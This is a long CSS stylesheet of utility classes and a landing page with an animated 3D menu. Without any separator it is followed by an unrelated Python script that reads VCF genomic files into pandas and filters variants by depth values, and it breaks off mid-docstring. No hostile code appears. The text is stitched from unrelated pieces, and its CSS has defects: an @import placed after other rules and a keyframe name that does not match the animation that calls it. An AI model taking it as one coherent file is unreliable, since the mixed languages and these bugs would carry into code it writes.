.m-r-63 {margin-right: 63px;}
.m-r-64 {margin-right: 64px;}
.m-r-65 {margin-right: 65px;}
.m-r-66 {margin-right: 66px;}
.m-r-67 {margin-right: 67px;}
.m-r-68 {margin-right: 68px;}
.m-r-69 {margin-right: 69px;}
.m-r-70 {margin-right: 70px;}
.m-r-71 {margin-right: 71px;}
.m-r-72 {margin-right: 72px;}
.m-r-73 {margin-right: 73px;}
.m-r-74 {margin-right: 74px;}
.m-r-75 {margin-right: 75px;}
.m-r-76 {margin-right: 76px;}
.m-r-77 {margin-right: 77px;}
.m-r-78 {margin-right: 78px;}
.m-r-79 {margin-right: 79px;}
.m-r-80 {margin-right: 80px;}
.m-r-81 {margin-right: 81px;}
.m-r-82 {margin-right: 82px;}
.m-r-83 {margin-right: 83px;}
.m-r-84 {margin-right: 84px;}
.m-r-85 {margin-right: 85px;}
.m-r-86 {margin-right: 86px;}
.m-r-87 {margin-right: 87px;}
.m-r-88 {margin-right: 88px;}
.m-r-89 {margin-right: 89px;}
.m-r-90 {margin-right: 90px;}
.m-r-91 {margin-right: 91px;}
.m-r-92 {margin-right: 92px;}
.m-r-93 {margin-right: 93px;}
.m-r-94 {margin-right: 94px;}
.m-r-95 {margin-right: 95px;}
.m-r-96 {margin-right: 96px;}
.m-r-97 {margin-right: 97px;}
.m-r-98 {margin-right: 98px;}
.m-r-99 {margin-right: 99px;}
.m-r-100 {margin-right: 100px;}
.m-r-101 {margin-right: 101px;}
.m-r-102 {margin-right: 102px;}
.m-r-103 {margin-right: 103px;}
.m-r-104 {margin-right: 104px;}
.m-r-105 {margin-right: 105px;}
.m-r-106 {margin-right: 106px;}
.m-r-107 {margin-right: 107px;}
.m-r-108 {margin-right: 108px;}
.m-r-109 {margin-right: 109px;}
.m-r-110 {margin-right: 110px;}
.m-r-111 {margin-right: 111px;}
.m-r-112 {margin-right: 112px;}
.m-r-113 {margin-right: 113px;}
.m-r-114 {margin-right: 114px;}
.m-r-115 {margin-right: 115px;}
.m-r-116 {margin-right: 116px;}
.m-r-117 {margin-right: 117px;}
.m-r-118 {margin-right: 118px;}
.m-r-119 {margin-right: 119px;}
.m-r-120 {margin-right: 120px;}
.m-r-121 {margin-right: 121px;}
.m-r-122 {margin-right: 122px;}
.m-r-123 {margin-right: 123px;}
.m-r-124 {margin-right: 124px;}
.m-r-125 {margin-right: 125px;}
.m-r-126 {margin-right: 126px;}
.m-r-127 {margin-right: 127px;}
.m-r-128 {margin-right: 128px;}
.m-r-129 {margin-right: 129px;}
.m-r-130 {margin-right: 130px;}
.m-r-131 {margin-right: 131px;}
.m-r-132 {margin-right: 132px;}
.m-r-133 {margin-right: 133px;}
.m-r-134 {margin-right: 134px;}
.m-r-135 {margin-right: 135px;}
.m-r-136 {margin-right: 136px;}
.m-r-137 {margin-right: 137px;}
.m-r-138 {margin-right: 138px;}
.m-r-139 {margin-right: 139px;}
.m-r-140 {margin-right: 140px;}
.m-r-141 {margin-right: 141px;}
.m-r-142 {margin-right: 142px;}
.m-r-143 {margin-right: 143px;}
.m-r-144 {margin-right: 144px;}
.m-r-145 {margin-right: 145px;}
.m-r-146 {margin-right: 146px;}
.m-r-147 {margin-right: 147px;}
.m-r-148 {margin-right: 148px;}
.m-r-149 {margin-right: 149px;}
.m-r-150 {margin-right: 150px;}
.m-r-151 {margin-right: 151px;}
.m-r-152 {margin-right: 152px;}
.m-r-153 {margin-right: 153px;}
.m-r-154 {margin-right: 154px;}
.m-r-155 {margin-right: 155px;}
.m-r-156 {margin-right: 156px;}
.m-r-157 {margin-right: 157px;}
.m-r-158 {margin-right: 158px;}
.m-r-159 {margin-right: 159px;}
.m-r-160 {margin-right: 160px;}
.m-r-161 {margin-right: 161px;}
.m-r-162 {margin-right: 162px;}
.m-r-163 {margin-right: 163px;}
.m-r-164 {margin-right: 164px;}
.m-r-165 {margin-right: 165px;}
.m-r-166 {margin-right: 166px;}
.m-r-167 {margin-right: 167px;}
.m-r-168 {margin-right: 168px;}
.m-r-169 {margin-right: 169px;}
.m-r-170 {margin-right: 170px;}
.m-r-171 {margin-right: 171px;}
.m-r-172 {margin-right: 172px;}
.m-r-173 {margin-right: 173px;}
.m-r-174 {margin-right: 174px;}
.m-r-175 {margin-right: 175px;}
.m-r-176 {margin-right: 176px;}
.m-r-177 {margin-right: 177px;}
.m-r-178 {margin-right: 178px;}
.m-r-179 {margin-right: 179px;}
.m-r-180 {margin-right: 180px;}
.m-r-181 {margin-right: 181px;}
.m-r-182 {margin-right: 182px;}
.m-r-183 {margin-right: 183px;}
.m-r-184 {margin-right: 184px;}
.m-r-185 {margin-right: 185px;}
.m-r-186 {margin-right: 186px;}
.m-r-187 {margin-right: 187px;}
.m-r-188 {margin-right: 188px;}
.m-r-189 {margin-right: 189px;}
.m-r-190 {margin-right: 190px;}
.m-r-191 {margin-right: 191px;}
.m-r-192 {margin-right: 192px;}
.m-r-193 {margin-right: 193px;}
.m-r-194 {margin-right: 194px;}
.m-r-195 {margin-right: 195px;}
.m-r-196 {margin-right: 196px;}
.m-r-197 {margin-right: 197px;}
.m-r-198 {margin-right: 198px;}
.m-r-199 {margin-right: 199px;}
.m-r-200 {margin-right: 200px;}
.m-r-201 {margin-right: 201px;}
.m-r-202 {margin-right: 202px;}
.m-r-203 {margin-right: 203px;}
.m-r-204 {margin-right: 204px;}
.m-r-205 {margin-right: 205px;}
.m-r-206 {margin-right: 206px;}
.m-r-207 {margin-right: 207px;}
.m-r-208 {margin-right: 208px;}
.m-r-209 {margin-right: 209px;}
.m-r-210 {margin-right: 210px;}
.m-r-211 {margin-right: 211px;}
.m-r-212 {margin-right: 212px;}
.m-r-213 {margin-right: 213px;}
.m-r-214 {margin-right: 214px;}
.m-r-215 {margin-right: 215px;}
.m-r-216 {margin-right: 216px;}
.m-r-217 {margin-right: 217px;}
.m-r-218 {margin-right: 218px;}
.m-r-219 {margin-right: 219px;}
.m-r-220 {margin-right: 220px;}
.m-r-221 {margin-right: 221px;}
.m-r-222 {margin-right: 222px;}
.m-r-223 {margin-right: 223px;}
.m-r-224 {margin-right: 224px;}
.m-r-225 {margin-right: 225px;}
.m-r-226 {margin-right: 226px;}
.m-r-227 {margin-right: 227px;}
.m-r-228 {margin-right: 228px;}
.m-r-229 {margin-right: 229px;}
.m-r-230 {margin-right: 230px;}
.m-r-231 {margin-right: 231px;}
.m-r-232 {margin-right: 232px;}
.m-r-233 {margin-right: 233px;}
.m-r-234 {margin-right: 234px;}
.m-r-235 {margin-right: 235px;}
.m-r-236 {margin-right: 236px;}
.m-r-237 {margin-right: 237px;}
.m-r-238 {margin-right: 238px;}
.m-r-239 {margin-right: 239px;}
.m-r-240 {margin-right: 240px;}
.m-r-241 {margin-right: 241px;}
.m-r-242 {margin-right: 242px;}
.m-r-243 {margin-right: 243px;}
.m-r-244 {margin-right: 244px;}
.m-r-245 {margin-right: 245px;}
.m-r-246 {margin-right: 246px;}
.m-r-247 {margin-right: 247px;}
.m-r-248 {margin-right: 248px;}
.m-r-249 {margin-right: 249px;}
.m-r-250 {margin-right: 250px;}
.m-l-r-auto {margin-left: auto;	margin-right: auto;}
.m-l-auto {margin-left: auto;}
.m-r-auto {margin-right: auto;}



/*[ TEXT ]
///////////////////////////////////////////////////////////
*/
/* ------------------------------------ */
.text-white {color: white;}
.text-black {color: black;}

.text-hov-white:hover {color: white;}

/* ------------------------------------ */
.text-up {text-transform: uppercase;}

/* ------------------------------------ */
.text-center {text-align: center;}
.text-left {text-align: left;}
.text-right {text-align: right;}
.text-middle {vertical-align: middle;}

/* ------------------------------------ */
.lh-1-0 {line-height: 1.0;}
.lh-1-1 {line-height: 1.1;}
.lh-1-2 {line-height: 1.2;}
.lh-1-3 {line-height: 1.3;}
.lh-1-4 {line-height: 1.4;}
.lh-1-5 {line-height: 1.5;}
.lh-1-6 {line-height: 1.6;}
.lh-1-7 {line-height: 1.7;}
.lh-1-8 {line-height: 1.8;}
.lh-1-9 {line-height: 1.9;}
.lh-2-0 {line-height: 2.0;}
.lh-2-1 {line-height: 2.1;}
.lh-2-2 {line-height: 2.2;}
.lh-2-3 {line-height: 2.3;}
.lh-2-4 {line-height: 2.4;}
.lh-2-5 {line-height: 2.5;}
.lh-2-6 {line-height: 2.6;}
.lh-2-7 {line-height: 2.7;}
.lh-2-8 {line-height: 2.8;}
.lh-2-9 {line-height: 2.9;}





/*[ SHAPE ]
///////////////////////////////////////////////////////////
*/

/*[ Display ]
-----------------------------------------------------------
*/
.dis-none {display: none;}
.dis-block {display: block;}
.dis-inline {display: inline;}
.dis-inline-block {display: inline-block;}
.dis-flex {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
}

/*[ Position ]
-----------------------------------------------------------
*/
.pos-relative {position: relative;}
.pos-absolute {position: absolute;}
.pos-fixed {position: fixed;}

/*[ float ]
-----------------------------------------------------------
*/
.float-l {float: left;}
.float-r {float: right;}


/*[ Width & Height ]
-----------------------------------------------------------
*/
.sizefull {
	width: 100%;
	height: 100%;
}
.w-full {width: 100%;}
.h-full {height: 100%;}
.max-w-full {max-width: 100%;}
.max-h-full {max-height: 100%;}
.min-w-full {min-width: 100%;}
.min-h-full {min-height: 100%;}

/*[ Top Bottom Left Right ]
-----------------------------------------------------------
*/
.top-0 {top: 0;}
.bottom-0 {bottom: 0;}
.left-0 {left: 0;}
.right-0 {right: 0;}

.top-auto {top: auto;}
.bottom-auto {bottom: auto;}
.left-auto {left: auto;}
.right-auto {right: auto;}


/*[ Opacity ]
-----------------------------------------------------------
*/
.op-0-0 {opacity: 0;}
.op-0-1 {opacity: 0.1;}
.op-0-2 {opacity: 0.2;}
.op-0-3 {opacity: 0.3;}
.op-0-4 {opacity: 0.4;}
.op-0-5 {opacity: 0.5;}
.op-0-6 {opacity: 0.6;}
.op-0-7 {opacity: 0.7;}
.op-0-8 {opacity: 0.8;}
.op-0-9 {opacity: 0.9;}
.op-1-0 {opacity: 1;}

/*[ Background ]
-----------------------------------------------------------
*/
.bgwhite {background-color: white;}
.bgblack {background-color: black;}



/*[ Wrap Picture ]
-----------------------------------------------------------
*/
.wrap-pic-w img {width: 100%;}
.wrap-pic-max-w img {max-width: 100%;}

/* ------------------------------------ */
.wrap-pic-h img {height: 100%;}
.wrap-pic-max-h img {max-height: 100%;}

/* ------------------------------------ */
.wrap-pic-cir {
	border-radius: 50%;
	overflow: hidden;
}
.wrap-pic-cir img {
	width: 100%;
}



/*[ Hover ]
-----------------------------------------------------------
*/
.hov-pointer:hover {cursor: pointer;}

/* ------------------------------------ */
.hov-img-zoom {
	display: block;
	overflow: hidden;
}
.hov-img-zoom img{
	width: 100%;
	-webkit-transition: all 0.6s;
    -o-transition: all 0.6s;
    -moz-transition: all 0.6s;
    transition: all 0.6s;
}
.hov-img-zoom:hover img {
	-webkit-transform: scale(1.1);
  	-moz-transform: scale(1.1);
  	-ms-transform: scale(1.1);
  	-o-transform: scale(1.1);
	transform: scale(1.1);
}



/*[  ]
-----------------------------------------------------------
*/
.bo-cir {border-radius: 50%;}

.of-hidden {overflow: hidden;}

.visible-false {visibility: hidden;}
.visible-true {visibility: visible;}




/*[ Transition ]
-----------------------------------------------------------
*/
.trans-0-1 {
	-webkit-transition: all 0.1s;
    -o-transition: all 0.1s;
    -moz-transition: all 0.1s;
    transition: all 0.1s;
}
.trans-0-2 {
	-webkit-transition: all 0.2s;
    -o-transition: all 0.2s;
    -moz-transition: all 0.2s;
    transition: all 0.2s;
}
.trans-0-3 {
	-webkit-transition: all 0.3s;
    -o-transition: all 0.3s;
    -moz-transition: all 0.3s;
    transition: all 0.3s;
}
.trans-0-4 {
	-webkit-transition: all 0.4s;
    -o-transition: all 0.4s;
    -moz-transition: all 0.4s;
    transition: all 0.4s;
}
.trans-0-5 {
	-webkit-transition: all 0.5s;
    -o-transition: all 0.5s;
    -moz-transition: all 0.5s;
    transition: all 0.5s;
}
.trans-0-6 {
	-webkit-transition: all 0.6s;
    -o-transition: all 0.6s;
    -moz-transition: all 0.6s;
    transition: all 0.6s;
}
.trans-0-9 {
	-webkit-transition: all 0.9s;
    -o-transition: all 0.9s;
    -moz-transition: all 0.9s;
    transition: all 0.9s;
}
.trans-1-0 {
	-webkit-transition: all 1s;
    -o-transition: all 1s;
    -moz-transition: all 1s;
    transition: all 1s;
}



/*[ Layout ]
///////////////////////////////////////////////////////////
*/

/*[ Flex ]
-----------------------------------------------------------
*/
/* ------------------------------------ */
.flex-w {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-wrap: wrap;
	-moz-flex-wrap: wrap;
	-ms-flex-wrap: wrap;
	-o-flex-wrap: wrap;
	flex-wrap: wrap;
}

/* ------------------------------------ */
.flex-l {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	justify-content: flex-start;
}

.flex-r {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	justify-content: flex-end;
}

.flex-c {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	justify-content: center;
}

.flex-sa {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	justify-content: space-around;
}

.flex-sb {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	justify-content: space-between;
}

/* ------------------------------------ */
.flex-t {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-ms-align-items: flex-start;
	align-items: flex-start;
}

.flex-b {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-ms-align-items: flex-end;
	align-items: flex-end;
}

.flex-m {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-ms-align-items: center;
	align-items: center;
}

.flex-str {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-ms-align-items: stretch;
	align-items: stretch;
}

/* ------------------------------------ */
.flex-row {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: row;
	-moz-flex-direction: row;
	-ms-flex-direction: row;
	-o-flex-direction: row;
	flex-direction: row;
}

.flex-row-rev {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: row-reverse;
	-moz-flex-direction: row-reverse;
	-ms-flex-direction: row-reverse;
	-o-flex-direction: row-reverse;
	flex-direction: row-reverse;
}

.flex-col {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: column;
	-moz-flex-direction: column;
	-ms-flex-direction: column;
	-o-flex-direction: column;
	flex-direction: column;
}

.flex-col-rev {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: column-reverse;
	-moz-flex-direction: column-reverse;
	-ms-flex-direction: column-reverse;
	-o-flex-direction: column-reverse;
	flex-direction: column-reverse;
}

/* ------------------------------------ */
.flex-c-m {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	justify-content: center;
	-ms-align-items: center;
	align-items: center;
}

.flex-c-t {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	justify-content: center;
	-ms-align-items: flex-start;
	align-items: flex-start;
}

.flex-c-b {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	justify-content: center;
	-ms-align-items: flex-end;
	align-items: flex-end;
}

.flex-c-str {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	justify-content: center;
	-ms-align-items: stretch;
	align-items: stretch;
}

.flex-l-m {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	justify-content: flex-start;
	-ms-align-items: center;
	align-items: center;
}

.flex-r-m {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	justify-content: flex-end;
	-ms-align-items: center;
	align-items: center;
}

.flex-sa-m {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	justify-content: space-around;
	-ms-align-items: center;
	align-items: center;
}

.flex-sb-m {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	justify-content: space-between;
	-ms-align-items: center;
	align-items: center;
}

/* ------------------------------------ */
.flex-col-l {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: column;
	-moz-flex-direction: column;
	-ms-flex-direction: column;
	-o-flex-direction: column;
	flex-direction: column;
	-ms-align-items: flex-start;
	align-items: flex-start;
}

.flex-col-r {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: column;
	-moz-flex-direction: column;
	-ms-flex-direction: column;
	-o-flex-direction: column;
	flex-direction: column;
	-ms-align-items: flex-end;
	align-items: flex-end;
}

.flex-col-c {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: column;
	-moz-flex-direction: column;
	-ms-flex-direction: column;
	-o-flex-direction: column;
	flex-direction: column;
	-ms-align-items: center;
	align-items: center;
}

.flex-col-l-m {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: column;
	-moz-flex-direction: column;
	-ms-flex-direction: column;
	-o-flex-direction: column;
	flex-direction: column;
	-ms-align-items: flex-start;
	align-items: flex-start;
	justify-content: center;
}

.flex-col-r-m {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: column;
	-moz-flex-direction: column;
	-ms-flex-direction: column;
	-o-flex-direction: column;
	flex-direction: column;
	-ms-align-items: flex-end;
	align-items: flex-end;
	justify-content: center;
}

.flex-col-c-m {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: column;
	-moz-flex-direction: column;
	-ms-flex-direction: column;
	-o-flex-direction: column;
	flex-direction: column;
	-ms-align-items: center;
	align-items: center;
	justify-content: center;
}

.flex-col-str {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: column;
	-moz-flex-direction: column;
	-ms-flex-direction: column;
	-o-flex-direction: column;
	flex-direction: column;
	-ms-align-items: stretch;
	align-items: stretch;
}

.flex-col-sb {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: column;
	-moz-flex-direction: column;
	-ms-flex-direction: column;
	-o-flex-direction: column;
	flex-direction: column;
	justify-content: space-between;
}

/* ------------------------------------ */
.flex-col-rev-l {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: column-reverse;
	-moz-flex-direction: column-reverse;
	-ms-flex-direction: column-reverse;
	-o-flex-direction: column-reverse;
	flex-direction: column-reverse;
	-ms-align-items: flex-start;
	align-items: flex-start;
}

.flex-col-rev-r {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: column-reverse;
	-moz-flex-direction: column-reverse;
	-ms-flex-direction: column-reverse;
	-o-flex-direction: column-reverse;
	flex-direction: column-reverse;
	-ms-align-items: flex-end;
	align-items: flex-end;
}

.flex-col-rev-c {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: column-reverse;
	-moz-flex-direction: column-reverse;
	-ms-flex-direction: column-reverse;
	-o-flex-direction: column-reverse;
	flex-direction: column-reverse;
	-ms-align-items: center;
	align-items: center;
}

.flex-col-rev-str {
	display: -webkit-box;
	display: -webkit-flex;
	display: -moz-box;
	display: -ms-flexbox;
	display: flex;
	-webkit-flex-direction: column-reverse;
	-moz-flex-direction: column-reverse;
	-ms-flex-direction: column-reverse;
	-o-flex-direction: column-reverse;
	flex-direction: column-reverse;
	-ms-align-items: stretch;
	align-items: stretch;
}


/*[ Absolute ]
-----------------------------------------------------------
*/
.ab-c-m {
	position: absolute;
	top: 50%;
	left: 50%;
	-webkit-transform: translate(-50%, -50%);
  	-moz-transform: translate(-50%, -50%);
  	-ms-transform: translate(-50%, -50%);
  	-o-transform: translate(-50%, -50%);
	transform: translate(-50%, -50%);
}

.ab-c-t {
	position: absolute;
	top: 0px;
	left: 50%;
	-webkit-transform: translateX(-50%);
  	-moz-transform: translateX(-50%);
  	-ms-transform: translateX(-50%);
  	-o-transform: translateX(-50%);
	transform: translateX(-50%);
}

.ab-c-b {
	position: absolute;
	bottom: 0px;
	left: 50%;
	-webkit-transform: translateX(-50%);
  	-moz-transform: translateX(-50%);
  	-ms-transform: translateX(-50%);
  	-o-transform: translateX(-50%);
	transform: translateX(-50%);
}

.ab-l-m {
	position: absolute;
	left: 0px;
	top: 50%;
	-webkit-transform: translateY(-50%);
  	-moz-transform: translateY(-50%);
  	-ms-transform: translateY(-50%);
  	-o-transform: translateY(-50%);
	transform: translateY(-50%);
}

.ab-r-m {
	position: absolute;
	right: 0px;
	top: 50%;
	-webkit-transform: translateY(-50%);
  	-moz-transform: translateY(-50%);
  	-ms-transform: translateY(-50%);
  	-o-transform: translateY(-50%);
	transform: translateY(-50%);
}

.ab-t-l {
	position: absolute;
	left: 0px;
	top: 0px;
}

.ab-t-r {
	position: absolute;
	right: 0px;
	top: 0px;
}

.ab-b-l {
	position: absolute;
	left: 0px;
	bottom: 0px;
}

.ab-b-r {
	position: absolute;
	right: 0px;
	bottom: 0px;
}









:root{
    --main-color:rgba(255, 32, 110, 1);
}

@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap");
* {
  padding: 0;
  margin: 0;
  box-sizing: border-box;
}


body,
button {
  font-family: "Poppins", sans-serif;
}

.containerr {
  min-height: 100vh;
  width: 100%;
  background-color: #485461;
  background-image: linear-gradient(135deg, #485461 0%, #28313b 74%);
  overflow-x: hidden;
  transform-style: preserve-3d;
}

.navbarr {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  z-index: 10;
  height: 3rem;
}

.menuu {
  max-width: 72rem;
  width: 100%;
  margin: 0 auto;
  padding: 0 2rem;
  display: flex;
  justify-content: space-between;
  align-items: center;
  color: #fff;
}

.logoo {
  font-size: 1.1rem;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 2px;
  line-height: 4rem;
}

.logoo span {
  font-weight: 300;
}

.hamburger-menuu {
  height: 4rem;
  width: 3rem;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: flex-end;
}

.barr {
  width: 1.9rem;
  height: 1.5px;
  border-radius: 2px;
  background-color: #eee;
  transition: 0.5s;
  position: relative;
}

.barr:before,
.barr:after {
  content: "";
  position: absolute;
  width: inherit;
  height: inherit;
  background-color: #eee;
  transition: 0.5s;
}

.barr:before {
  transform: translateY(-9px);
}

.barr:after {
  transform: translateY(9px);
}

.mainn {
  position: relative;
  width: 100%;
  left: 0;
  z-index: 5;
  overflow: hidden;
  transform-origin: left;
  transform-style: preserve-3d;
  transition: 0.5s;
}

header {
  min-height: 100vh;
  width: 100%;
  background: url("bg.jpg") no-repeat top center / cover;
  position: relative;
}

.overlayy {
  position: absolute;
  width: 100%;
  height: 100%;
  top: 0;
  left: 0;
  background-color: rgba(43, 51, 59, 0.8);
  display: flex;
  justify-content: center;
  align-items: center;
}

.innerr {
  max-width: 35rem;
  text-align: center;
  color: #fff;
  padding: 0 2rem;
}

.innerr p,.innerr h2{
  margin-top: 16px;
  margin-bottom: 16px;
}
.I-letters{
  color:#fff;
}
.letterM{
  color:lightgreen;
}
.letterO{
  color:#1179e7;
}
.letterL{
  color:#fff;
}
.letterE{
  color: lightgreen;
}
.letterA{
  color: #1179e7;
}
.letterB{

}

.titlee {
  font-size: 2.7rem;
}

.bttnn {
  margin-top: 1rem;
  padding: 0.6rem 1.8rem;
  background-color: #1179e7;
  border: none;
  border-radius: 25px;
  color: #fff;
  text-transform: uppercase;
  cursor: pointer;
  text-decoration: none;
}

.containerr.active .barr {
  transform: rotate(360deg);
  background-color: transparent;
}

.containerr.active .barr:before {
  transform: translateY(0) rotate(45deg);
}

.containerr.active .barr:after {
  transform: translateY(0) rotate(-45deg);
}

.containerr.active .mainn {
  animation: main-animation 0.5s ease;
  cursor: pointer;
  transform: perspective(1300px) rotateY(20deg) translateZ(310px) scale(0.5);
}

@keyframes main-animation {
  from {
    transform: translate(0);
  }

  to {
    transform: perspective(1300px) rotateY(20deg) translateZ(310px) scale(0.5);
  }
}

.links {
  position: absolute;
  width: 30%;
  right: 0;
  top: 0;
  height: 100vh;
  z-index: 2;
  display: flex;
  justify-content: center;
  align-items: center;
}

ul {
  list-style: none;
}

.links a {
  text-decoration: none;
  color: #eee;
  padding: 0.7rem 0;
  display: inline-block;
  font-size: 1rem;
  font-weight: 300;
  text-transform: uppercase;
  letter-spacing: 1px;
  transition: 0.3s;
  opacity: 0;
  transform: translateY(10px);
  animation: hide 0.5s forwards ease;
}

.links a:hover {
  color: #fff;
}

.containerr.active .links a {
  animation: appear 0.5s forwards ease var(--i);
}

@keyframes appear {
  from {
    opacity: 0;
    transform: translateY(10px);
  }
  to {
    opacity: 1;
    transform: translateY(0px);
  }
}

@keyframes hide {
  from {
    opacity: 1;
    transform: translateY(0px);
  }
  to {
    opacity: 0;
    transform: translateY(10px);
  }
}

.shadoww {
  position: absolute;
  width: 100%;
  height: 100vh;
  top: 0;
  left: 0;
  transform-style: preserve-3d;
  transform-origin: left;
  transition: 0.5s;
  background-color: white;
}

.shadoww.one {
  z-index: -1;
  opacity: 0.15;
}

.shadoww.two {
  z-index: -2;
  opacity: 0.1;
}

.containerr.active .shadoww.one {
  animation: shadow-one 0.6s ease-out;
  transform: perspective(1300px) rotateY(20deg) translateZ(215px) scale(0.5);
}

@keyframes shadoww-one {
  0% {
    transform: translate(0);
  }

  5% {
    transform: perspective(1300px) rotateY(20deg) translateZ(310px) scale(0.5);
  }

  100% {
    transform: perspective(1300px) rotateY(20deg) translateZ(215px) scale(0.5);
  }
}

.containerr.active .shadoww.two {
  animation: shadow-two 0.6s ease-out;
  transform: perspective(1300px) rotateY(20deg) translateZ(120px) scale(0.5);
}

@keyframes shadow-two {
  0% {
    transform: translate(0);
  }

  20% {
    transform: perspective(1300px) rotateY(20deg) translateZ(310px) scale(0.5);
  }

  100% {
    transform: perspective(1300px) rotateY(20deg) translateZ(120px) scale(0.5);
  }
}

.containerr.active .mainn:hover + .shadoww.one {
  transform: perspective(1300px) rotateY(20deg) translateZ(230px) scale(0.5);
}

.container.active .main:hover {
  transform: perspective(1300px) rotateY(20deg) translateZ(340px) scale(0.5);
}

.gallery img{
    width: 100px;
}

.gallery .job{
    position: relative;
}

.gallery .job::after{
    content:"";
    width:80px;
    height:3px;
    background-color: rgba(255, 32, 110, 1);
    position: absolute;
    top:110%;
    left:50%;
    transform: translate(-50%);
}

.mySlider{
    border-radius: 50% !important;
    text-indent: 0px !important;
}

.feedback{
transform: translateY(50%);
}

import pandas as pd
import gzip
import os

"""
    this function read file vcf and return it to dataframe
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return vcf : vcf as dataframe
"""


def read_vcf(filename):
    print(filename)
    if filename.endswith('.vcf.gz'):
        try:
            f = gzip.open(filename, 'rt', encoding='utf-8')
            # Check the gzip header to confirm if the file is valid
            f.read(1)
            f.seek(0)
        except OSError:
            f = open(filename, 'r', encoding='utf-8')
    elif filename.endswith('.vcf'):
        f = open(filename, 'r', encoding='utf-8')
    else:
        raise ValueError("Invalid file extension: {}".format(filename))

    header = []
    data1 = []
    data2 = []
    for line in f:
        if line.startswith('#CHROM'):
            header.append(line.strip())
        if line.startswith('#'):
            data2.append(line)
        else:
            data1.append(line.strip())
    f.close()
    header = header[0].split('\t')
    data1 = [line.split('\t') for line in data1]
    dataframe = pd.DataFrame(data1, columns=header)
    return dataframe, data2


"""
    this function get dataframe and convert it to dictionary
        input:
            :param Data - pandas dataframe : vcf data 
        output:
            :return : dict() that has the key and value for comparing 
"""


def dictionary(dataframe):
    dic = dict()
    for i, index in enumerate(dataframe.index.tolist()):
        dic[index] = dataframe.iloc[i][-1].split(":")
    return dic


"""
    this function get dataframe and position numbers after comparing to get them from the dataframe
        input:
            :param Data - pandas dataframe : vcf data
            :param Position - position numbers : list of positions numbers
        output:
            :return : dataframe that has the target positions 
"""


def returnToDataFrame(dataframe, position):
    return dataframe.iloc[position]


"""
    this function get dictionary of the dataframe and splitting and compare the condition that has 
    the target positions indexes
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return : list that has the target positions indexes 
"""


def biggerThanOperation(dic):
    matched_data = []
    for key, value in dic.items():
        if int(value[1].split(',')[0]) >= 3 and int(value[1].split(',')[1]) >= 3:
            matched_data.append(key)
    return matched_data


"""
    this function write the target vcf data
        input:
